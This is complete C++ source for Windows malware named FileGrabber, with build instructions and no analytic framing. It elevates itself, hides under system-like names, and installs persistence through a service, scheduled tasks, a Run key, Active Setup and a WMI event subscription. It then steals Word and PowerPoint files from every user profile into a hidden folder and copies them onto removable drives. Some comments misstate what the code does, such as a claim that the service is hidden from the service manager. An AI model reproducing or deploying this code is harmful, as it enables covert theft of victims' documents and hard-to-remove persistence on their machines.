// FileGrabber_AllInOne.cpp
// Compile with: x86_64-w64-mingw32-g++ -o FileGrabber.exe FileGrabber_AllInOne.cpp -static -std=c++17 -lshlwapi -lole32 -loleaut32 -lwbemuuid -lcomsuppw -lcrypt32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iostream>
#include <filesystem>
#include <vector>
#include <thread>
#include <chrono>
#include <string>
#include <algorithm>
#include <comdef.h>
#include <Wbemidl.h>
#include <lm.h>
#include <winternl.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "comsuppw.lib")

namespace fs = std::filesystem;

// ===================== CONFIGURATION =====================
const std::string STASH_DIR = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Store\\";
const std::string EXE_NAME = "svchost_ng.exe";
const std::string EXE_DEST = "C:\\Windows\\System32\\Tasks\\" + EXE_NAME;
const std::string SERVICE_NAME = "FileGrabberSvc";
const std::string SERVICE_DISPLAY = "Windows File Indexing Service";
const std::string TASK_NAME = "MicrosoftEdgeUpdateTask";
const std::string REG_KEY_NAME = "WindowsFontCache";
const std::string ACTIVE_SETUP_GUID = "{2C7339CF-2B09-4500-B78F-6B5E6F1C3F5A}";
// =========================================================

// ===================== UTILITY FUNCTIONS =====================
std::string GetExePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

void HideFile(const std::string& path) {
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

void HideDirectory(const std::string& path) {
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // Change timestamps to look like system folder
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    HANDLE hDir = CreateFileA(path.c_str(), FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hDir != INVALID_HANDLE_VALUE) {
        SetFileTime(hDir, &ft, &ft, &ft);
        CloseHandle(hDir);
    }
}

void Delay(int seconds) {
    std::this_thread::sleep_for(std::chrono::seconds(seconds));
}

bool IsProcessElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return false;
    
    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    BOOL success = GetTokenInformation(hToken, TokenElevation, &elevation, size, &size);
    CloseHandle(hToken);
    
    return success && elevation.TokenIsElevated;
}

bool ElevateProcess() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    
    if (ShellExecuteExA(&sei)) {
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
        return true;
    }
    return false;
}

// ===================== PERSISTENCE METHODS =====================

bool InstallService() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return false;
    
    // First delete if exists
    SC_HANDLE hService = OpenServiceA(hSCManager, SERVICE_NAME.c_str(), SERVICE_ALL_ACCESS);
    if (hService) {
        DeleteService(hService);
        CloseHandle(hService);
        Delay(2);
    }
    
    hService = CreateServiceA(
        hSCManager,
        SERVICE_NAME.c_str(),
        SERVICE_DISPLAY.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        EXE_DEST.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (hService) {
        SERVICE_DESCRIPTIONA desc = {"Manages file indexing for faster search queries"};
        ChangeServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, &desc);
        
        // Make service hidden from service manager UI
        SERVICE_FAILURE_ACTIONSA fail = {0};
        fail.dwResetPeriod = 86400;
        fail.lpCommand = NULL;
        fail.lpRebootMsg = NULL;
        fail.cActions = 1;
        fail.lpsaActions = NULL;
        ChangeServiceConfig2A(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fail);
        
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        
        // Start the service
        SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
        if (hSCM) {
            hService = OpenServiceA(hSCM, SERVICE_NAME.c_str(), SERVICE_START);
            if (hService) {
                StartServiceA(hService, 0, NULL);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCM);
        }
        return true;
    }
    CloseServiceHandle(hSCManager);
    return false;
}

bool InstallScheduledTask() {
    // Use schtasks.exe to create a hidden scheduled task
    std::string cmd = "/C schtasks /create /tn \"" + TASK_NAME + "\" /tr \"" + 
                      EXE_DEST + "\" /sc onstart /ru SYSTEM /f /it";
    
    SHELLEXECUTEA ShExec = {0};
    ShExec.cbSize = sizeof(SHELLEXECUTEA);
    ShExec.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShExec.hwnd = NULL;
    ShExec.lpVerb = NULL;
    ShExec.lpFile = "cmd.exe";
    ShExec.lpParameters = cmd.c_str();
    ShExec.lpDirectory = NULL;
    ShExec.nShow = SW_HIDE;
    ShExec.hInstApp = NULL;
    
    if (ShellExecuteExA(&ShExec)) {
        WaitForSingleObject(ShExec.hProcess, 3000);
        CloseHandle(ShExec.hProcess);
    }
    
    // Also add a logon trigger (for user login)
    cmd = "/C schtasks /create /tn \"" + TASK_NAME + "_logon\" /tr \"" + 
          EXE_DEST + "\" /sc onlogon /ru SYSTEM /f /it";
    
    ShExec.lpParameters = cmd.c_str();
    if (ShellExecuteExA(&ShExec)) {
        WaitForSingleObject(ShExec.hProcess, 3000);
        CloseHandle(ShExec.hProcess);
    }
    
    return true;
}

bool InstallRegistryRun() {
    HKEY hKey;
    std::string regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, REG_KEY_NAME.c_str(), 0, REG_SZ, 
                      (BYTE*)EXE_DEST.c_str(), EXE_DEST.length() + 1);
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool InstallActiveSetup() {
    HKEY hKey;
    std::string activeSetupPath = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ACTIVE_SETUP_GUID;
    
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, activeSetupPath.c_str(), 0, NULL, 
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "StubPath", 0, REG_SZ, (BYTE*)EXE_DEST.c_str(), EXE_DEST.length() + 1);
        std::string version = "1,0,0,1";
        RegSetValueExA(hKey, "Version", 0, REG_SZ, (BYTE*)version.c_str(), version.length() + 1);
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool InstallWMI() {
    HRESULT hres;
    
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return false;
    
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, 
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, 
        NULL, EOAC_NONE, NULL);
    
    IWbemLocator *pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) return false;
    
    IWbemServices *pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) return false;
    
    // Create event filter
    std::wstring wmiQuery = L"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='winlogon.exe'";
    std::wstring filterName = L"SystemStartFilter";
    std::wstring consumerName = L"FileGrabberConsumer";
    
    std::wstring filterWQL = L"__EventFilter.Name='" + filterName + L"'";
    std::wstring consumerWQL = L"CommandLineEventConsumer.Name='" + consumerName + L"'";
    
    // Delete existing if any
    pSvc->DeleteInstance(_bstr_t(filterWQL.c_str()), 0, 0, 0);
    pSvc->DeleteInstance(_bstr_t(consumerWQL.c_str()), 0, 0, 0);
    
    // Create filter
    IWbemClassObject *pFilterClass = NULL;
    IWbemClassObject *pFilter = NULL;
    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    pFilterClass->SpawnInstance(0, &pFilter);
    
    VARIANT v;
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(filterName.c_str());
    pFilter->Put(L"Name", 0, &v, 0);
    VariantClear(&v);
    
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(L"WQL");
    pFilter->Put(L"QueryLanguage", 0, &v, 0);
    VariantClear(&v);
    
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(wmiQuery.c_str());
    pFilter->Put(L"Query", 0, &v, 0);
    VariantClear(&v);
    
    pSvc->PutInstance(pFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    
    // Create consumer
    IWbemClassObject *pConsumerClass = NULL;
    IWbemClassObject *pConsumer = NULL;
    pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    pConsumerClass->SpawnInstance(0, &pConsumer);
    
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(consumerName.c_str());
    pConsumer->Put(L"Name", 0, &v, 0);
    VariantClear(&v);
    
    std::wstring exePathW(EXE_DEST.begin(), EXE_DEST.end());
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(exePathW.c_str());
    pConsumer->Put(L"CommandLineTemplate", 0, &v, 0);
    VariantClear(&v);
    
    pSvc->PutInstance(pConsumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    
    // Bind filter to consumer
    IWbemClassObject *pBindingClass = NULL;
    IWbemClassObject *pBinding = NULL;
    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    pBindingClass->SpawnInstance(0, &pBinding);
    
    std::wstring filterPath = L"__EventFilter.Name=\"" + filterName + L"\"";
    std::wstring consumerPath = L"CommandLineEventConsumer.Name=\"" + consumerName + L"\"";
    
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(filterPath.c_str());
    pBinding->Put(L"Filter", 0, &v, 0);
    VariantClear(&v);
    
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(consumerPath.c_str());
    pBinding->Put(L"Consumer", 0, &v, 0);
    VariantClear(&v);
    
    pSvc->PutInstance(pBinding, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    
    // Cleanup
    if (pFilter) pFilter->Release();
    if (pFilterClass) pFilterClass->Release();
    if (pConsumer) pConsumer->Release();
    if (pConsumerClass) pConsumerClass->Release();
    if (pBinding) pBinding->Release();
    if (pBindingClass) pBindingClass->Release();
    if (pSvc) pSvc->Release();
    if (pLoc) pLoc->Release();
    CoUninitialize();
    
    return true;
}

bool InstallAllPersistence() {
    bool result = true;
    
    // Copy self to destination
    std::string exePath = GetExePath();
    if (exePath != EXE_DEST) {
        try {
            fs::remove(EXE_DEST);
            fs::copy(exePath, EXE_DEST);
            HideFile(EXE_DEST);
        } catch(...) {
            result = false;
        }
    }
    
    // Install all persistence layers
    if (InstallService()) {
        // Already running as service
    }
    
    InstallScheduledTask();
    InstallRegistryRun();
    InstallActiveSetup();
    InstallWMI();
    
    return result;
}

// ===================== FILE STEALING LOGIC =====================

void CreateStashDir() {
    try {
        fs::create_directories(STASH_DIR);
        HideDirectory(STASH_DIR);
    } catch(...) {}
}

void ScanAndSteal() {
    std::vector<std::string> extensions = {".docx", ".doc", ".pptx", ".ppt"};
    std::string userProfile = "C:\\Users";
    
    try {
        for (auto& entry : fs::recursive_directory_iterator(userProfile,
                fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file()) {
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                
                if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                    std::string destPath = STASH_DIR + entry.path().filename().string();
                    
                    if (fs::exists(destPath)) {
                        std::string base = entry.path().stem().string();
                        std::string newDest = STASH_DIR + base + "_" + 
                            std::to_string(GetTickCount64()) + entry.path().extension().string();
                        try {
                            fs::copy(entry.path(), newDest, fs::copy_options::overwrite_existing);
                            HideFile(newDest);
                        } catch(...) {}
                    } else {
                        try {
                            fs::copy(entry.path(), destPath, fs::copy_options::overwrite_existing);
                            HideFile(destPath);
                        } catch(...) {}
                    }
                }
            }
        }
    } catch(...) {}
}

// ===================== USB DETECTION & EXFIL =====================

void ExfilToUSB() {
    char rootPaths[][4] = {"D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\"};
    
    for (auto& root : rootPaths) {
        std::string rootStr(root);
        UINT driveType = GetDriveTypeA(rootStr.c_str());
        
        if (driveType == DRIVE_REMOVABLE) {
            // Check if this is our USB (contains a marker file or not)
            std::string markerPath = rootStr + "System Volume Information";
            if (fs::exists(markerPath)) {
                // Create extraction folder
                std::string outputDir = rootStr + "Extracted_" + std::to_string(GetTickCount64());
                try {
                    fs::create_directories(outputDir);
                    
                    // Copy all stolen files
                    if (fs::exists(STASH_DIR)) {
                        for (auto& entry : fs::directory_iterator(STASH_DIR)) {
                            if (entry.is_regular_file()) {
                                std::string dest = outputDir + "\\" + entry.path().filename().string();
                                fs::copy(entry.path(), dest, fs::copy_options::overwrite_existing);
                            }
                        }
                    }
                } catch(...) {}
            }
        }
    }
}

void WatcherLoop() {
    std::vector<std::string> extensions = {".docx", ".doc", ".pptx", ".ppt"};
    std::string userProfile = "C:\\Users";
    int counter = 0;
    
    while (true) {
        // Scan for files every 15 seconds
        try {
            for (auto& entry : fs::recursive_directory_iterator(userProfile,
                    fs::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                    
                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                        std::string destPath = STASH_DIR + entry.path().filename().string();
                        
                        if (!fs::exists(destPath)) {
                            Delay(3);
                            try {
                                __int64 size1 = fs::file_size(entry.path());
                                Delay(2);
                                __int64 size2 = fs::file_size(entry.path());
                                
                                if (size1 == size2 && size1 > 0) {
                                    fs::copy(entry.path(), destPath, fs::copy_options::overwrite_existing);
                                    HideFile(destPath);
                                }
                            } catch(...) {}
                        }
                    }
                }
            }
        } catch(...) {}
        
        // Check for USB every 30 seconds
        counter++;
        if (counter % 2 == 0) {
            ExfilToUSB();
        }
        
        Delay(15);
    }
}

// ===================== SERVICE ENTRY POINT =====================

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    if (CtrlCode == SERVICE_CONTROL_STOP || CtrlCode == SERVICE_CONTROL_SHUTDOWN) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        SetEvent(g_ServiceStopEvent);
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME.c_str(), ServiceCtrlHandler);
    if (!g_StatusHandle) return;
    
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_ServiceStopEvent) return;
    
    // Initialize
    CreateStashDir();
    ScanAndSteal();
    
    // Start watcher in separate thread
    std::thread watcher(WatcherLoop);
    watcher.detach();
    
    // Wait for stop signal
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

// ===================== MAIN =====================

int main() {
    // Check if running as service
    if (__argc == 1) {
        // Try to run as service first
        SERVICE_TABLE_ENTRYA ServiceTable[] = {
            {(LPSTR)SERVICE_NAME.c_str(), (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
            {NULL, NULL}
        };
        
        if (!StartServiceCtrlDispatcherA(ServiceTable)) {
            // Not started as service, run in console mode
            // First, elevate if not already
            if (!IsProcessElevated()) {
                ElevateProcess();
                return 0;
            }
            
            // Install all persistence and start stealing
            InstallAllPersistence();
            
            CreateStashDir();
            ScanAndSteal();
            
            // Start watcher
            std::thread watcher(WatcherLoop);
            watcher.detach();
            
            // Keep running
            while (true) {
                Delay(60);
            }
        }
    }
    else if (__argc > 1) {
        std::string arg = __argv[1];
        
        if (arg == "install" || arg == "-install" || arg == "/install") {
            if (!IsProcessElevated()) {
                ElevateProcess();
                return 0;
            }
            InstallAllPersistence();
            CreateStashDir();
            ScanAndSteal();
        }
        else if (arg == "uninstall" || arg == "-uninstall" || arg == "/uninstall" || arg == "cleanup") {
            if (!IsProcessElevated()) {
                ElevateProcess();
                return 0;
            }
            
            // Stop and delete service
            SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
            if (hSCManager) {
                SC_HANDLE hService = OpenServiceA(hSCManager, SERVICE_NAME.c_str(), SERVICE_ALL_ACCESS);
                if (hService) {
                    SERVICE_STATUS status;
                    ControlService(hService, SERVICE_CONTROL_STOP, &status);
                    Delay(2);
                    DeleteService(hService);
                    CloseHandle(hService);
                }
                CloseHandle(hSCManager);
            }
            
            // Delete scheduled tasks
            system("schtasks /delete /tn \"MicrosoftEdgeUpdateTask\" /f >nul 2>&1");
            system("schtasks /delete /tn \"MicrosoftEdgeUpdateTask_logon\" /f >nul 2>&1");
            
            // Remove registry keys
            HKEY hKey;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                RegDeleteValueA(hKey, REG_KEY_NAME.c_str());
                RegCloseKey(hKey);
            }
            
            // Remove Active Setup
            std::string activeSetupPath = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ACTIVE_SETUP_GUID;
            RegDeleteKeyA(HKEY_LOCAL_MACHINE, activeSetupPath.c_str());
            
            // Remove files
            try {
                fs::remove(EXE_DEST);
                fs::remove_all(STASH_DIR);
            } catch(...) {}
            
            // Remove WMI (via wmic)
            system("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter WHERE Name=\"SystemStartFilter\" DELETE >nul 2>&1");
            system("wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer WHERE Name=\"FileGrabberConsumer\" DELETE >nul 2>&1");
        }
    }
    
    return 0;
}
